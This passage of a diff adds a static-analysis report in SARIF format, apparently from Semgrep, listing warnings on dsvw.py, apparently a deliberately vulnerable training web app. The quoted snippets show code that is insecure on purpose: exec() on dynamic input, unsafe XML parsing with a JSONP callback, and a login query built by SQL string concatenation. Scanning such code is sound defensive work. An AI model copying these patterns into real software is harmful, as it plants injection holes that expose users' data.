+            "matchBasedId/v1": "5a9f93aace5af11a9887044659983addbf7d674037a097b570a752bf7d8d6922e7f3c6ec633206396893673f645646488726b16f5bb99d7a1ada9bcf065e07a8_3"
+          },
+          "properties": {}
+        },
+        {
+          "ruleId": "b1988e74-6154-3dac-a2a7-9575f2e23ad1",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Detected the use of exec(). exec() can be dangerous if used to evaluate dynamic content. If this content can be input from outside the program, this may be a code injection vulnerability. Ensure evaluated content is not definable by external sources."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "dsvw.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 57,
+                  "startColumn": 21,
+                  "endLine": 57,
+                  "endColumn": 40,
+                  "snippet": {
+                    "text": "                    exec(program, envs)"
+                  }
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "matchBasedId/v1": "6f54d8a9bd155e0569776e965202ea7c8796684fc02e2dc6754f142b592006e2a02c487844ee744e7422e34721daad701c4bb5c9b70119ed65f2ad2ff50bfc7d_0"
+          },
+          "properties": {}
+        },
+        {
+          "ruleId": "7c8a9a14-1e4f-3829-bd00-eda0b7b726a1",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Insecure XML parsing functionality, prefer 'defusedxml'"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "dsvw.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 65,
+                  "startColumn": 176,
+                  "endLine": 65,
+                  "endColumn": 185,
+                  "snippet": {
+                    "text": "                content = \"%s%s%s\" % (\"\" if not \"callback\" in params else \"%s(\" % params[\"callback\"], json.dumps(dict((_.findtext(\"username\"), _.findtext(\"surname\")) for _ in xml.etree.ElementTree.fromstring(USERS_XML).findall(\"user\"))), \"\" if not \"callback\" in params else \")\")"
+                  }
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "matchBasedId/v1": "56a3d1743f5b96a16147c608c467ae2ea2741410df8f3a936e6f33fa357c2c37b7906769a3c183b485fd1be666a89090ff29c38b7900f0f35ffb95af73d23872_6"
+          },
+          "properties": {}
+        },
+        {
+          "ruleId": "256bea54-4dea-3198-b1f3-00a1a6d0cd99",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Minified, compressed, obfuscated or any other form of unreadable files is excluded from the scan, because although a strong indicator of maliciousness, its FP rate is relatively higher. It is highly recommended to store such files in CDN, cloud buckets, etc. and keep the codebase readable."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "dsvw.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 63,
+                  "startColumn": 1,
+                  "endLine": 63,
+                  "endColumn": 498,
+                  "snippet": {
+                    "text": "                    content += \"<div><span>Attacks:</span></div>\\n<ul>%s\\n</ul>\\n\" % (\"\".join(\"\\n<li%s>%s - <a href=\\\"%s\\\">vulnerable</a>|<a href=\\\"%s\\\">exploit</a>|<a href=\\\"%s\\\" target=\\\"_blank\\\">info</a></li>\" % (\" class=\\\"disabled\\\" title=\\\"module 'python-lxml' not installed\\\"\" if (\"lxml.etree\" not in sys.modules and any(_ in case[0].upper() for _ in (\"XML\", \"XPATH\"))) else \"\", case[0], case[1], case[2], case[3]) for case in CASES)).replace(\"<a href=\\\"None\\\">vulnerable</a>|\", \"<b>-</b>|\")"
+                  }
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "matchBasedId/v1": "5a9f93aace5af11a9887044659983addbf7d674037a097b570a752bf7d8d6922e7f3c6ec633206396893673f645646488726b16f5bb99d7a1ada9bcf065e07a8_4"
+          },
+          "properties": {}
+        },
+        {
+          "ruleId": "a856baaa-4e9a-35b0-93c5-e8cb2b6837f2",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Avoiding SQL string concatenation: untrusted input concatenated with raw SQL query can result in SQL Injection. In order to execute raw query safely, prepared statement should be used. SQLAlchemy provides TextualSQL to easily used prepared statement with named parameters. For complex SQL composition, use SQL Expression Language or Schema Definition Language. In most cases, SQLAlchemy ORM will be a better option."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "dsvw.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 67,
+                  "startColumn": 17,
+                  "endLine": 67,
+                  "endColumn": 178,
+                  "snippet": {
+                    "text": "                cursor.execute(\"SELECT * FROM users WHERE username='\" + re.sub(r\"[^\\w]\", \"\", params.get(\"username\", \"\")) + \"' AND password='\" + params.get(\"password\", \"\") + \"'\")"
+                  }
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "matchBasedId/v1": "d0465f20dc9a563e43b40dc804e92b7fb2ee1da312c113f8032b614be5505192800e5c522e7279b6cd7e29d6584cbee72f694ebeb70cfabf8bb638366ce1365b_0"
+          },
+          "properties": {}
+        },
+        {
+          "ruleId": "e64dd979-f00b-3d17-8614-b26acdfe84d5",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Regex `r\"[^\\w]\"` may be vulnerable to catastrophic backtracking, which may lead to denial of service attacks. (This rule only matches regex usage, not actual REDoS patterns. For full detection, use Semgrep Pro Engine.)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "dsvw.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 67,
+                  "startColumn": 73,
+                  "endLine": 67,
+                  "endColumn": 121,
+                  "snippet": {
+                    "text": "                cursor.execute(\"SELECT * FROM users WHERE username='\" + re.sub(r\"[^\\w]\", \"\", params.get(\"username\", \"\")) + \"' AND password='\" + params.get(\"password\", \"\") + \"'\")"
+                  }
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "matchBasedId/v1": "2c1ec177e2cc1b5355b86510e1507c3c24d9bb6c59de55627ac94b24efe642781dbb784ace2624e5adf2d18a5e1e26af83a932567c642673d7fe3b4f2e356518_0"
+          },
+          "properties": {}
+        },
+        {
+          "ruleId": "8d6699e4-220f-3254-a4b7-07a44ce05e8a",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Minified, compressed, obfuscated or any other form of unreadable files is excluded from the scan, because although a strong indicator of maliciousness, its FP rate is relatively higher. It is highly recommended to store such files in CDN, cloud buckets, etc. and keep the codebase readable."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "dsvw.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 68,
+                  "startColumn": 1,
+                  "endLine": 68,
+                  "endColumn": 454,
+                  "snippet": {
+                    "text": "                content += \"Welcome <b>%s</b><meta http-equiv=\\\"Set-Cookie\\\" content=\\\"SESSIONID=%s; path=/\\\"><meta http-equiv=\\\"refresh\\\" content=\\\"1; url=/\\\"/>\" % (re.sub(r\"[^\\w]\", \"\", params.get(\"username\", \"\")), \"\".join(random.sample(string.ascii_letters + string.digits, 20))) if cursor.fetchall() else \"The username and/or password is incorrect<meta http-equiv=\\\"Set-Cookie\\\" content=\\\"SESSIONID=; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT\\\">\""
+                  }
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "matchBasedId/v1": "5a9f93aace5af11a9887044659983addbf7d674037a097b570a752bf7d8d6922e7f3c6ec633206396893673f645646488726b16f5bb99d7a1ada9bcf065e07a8_5"
+          },
+          "properties": {}
+        },
+        {
+          "ruleId": "e04430a1-4843-3816-9c34-7a94eb2b9d14",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Regex `r\"[^\\w]\"` may be vulnerable to catastrophic backtracking, which may lead to denial of service attacks. (This rule only matches regex usage, not actual REDoS patterns. For full detection, use Semgrep Pro Engine.)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "dsvw.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 68,
+                  "startColumn": 167,
+                  "endLine": 68,
+                  "endColumn": 215,
+                  "snippet": {
+                    "text": "                content += \"Welcome <b>%s</b><meta http-equiv=\\\"Set-Cookie\\\" content=\\\"SESSIONID=%s; path=/\\\"><meta http-equiv=\\\"refresh\\\" content=\\\"1; url=/\\\"/>\" % (re.sub(r\"[^\\w]\", \"\", params.get(\"username\", \"\")), \"\".join(random.sample(string.ascii_letters + string.digits, 20))) if cursor.fetchall() else \"The username and/or password is incorrect<meta http-equiv=\\\"Set-Cookie\\\" content=\\\"SESSIONID=; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT\\\">\""
+                  }
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "matchBasedId/v1": "2c1ec177e2cc1b5355b86510e1507c3c24d9bb6c59de55627ac94b24efe642781dbb784ace2624e5adf2d18a5e1e26af83a932567c642673d7fe3b4f2e356518_1"
+          },
+          "properties": {}
+        }
+      ],
+      "newlineSequences": [
+        "\r\n",
+        "\n"
+      ]
+    }
+  ]
+}
